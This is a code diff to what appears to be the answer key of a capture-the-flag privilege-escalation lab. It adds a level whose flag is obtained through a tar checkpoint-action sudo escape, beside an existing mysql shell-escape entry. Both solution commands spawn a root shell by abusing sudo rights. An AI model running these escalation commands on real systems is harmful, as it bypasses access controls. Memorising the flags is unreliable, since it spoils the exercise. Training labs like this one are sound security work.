@@ -55,8 +55,12 @@ const SOLUTIONS = {
     },
     31: {
         flag: 'flag{mysql_bang_escape_pwn}',
-        final: true,
         cmds: ["sudo mysql -e '\\! /bin/sh'"]
+    },
+    32: {
+        flag: 'flag{tar_checkpoint_action_pwn}',
+        final: true,
+        cmds: ['sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh']
     },
 };
 
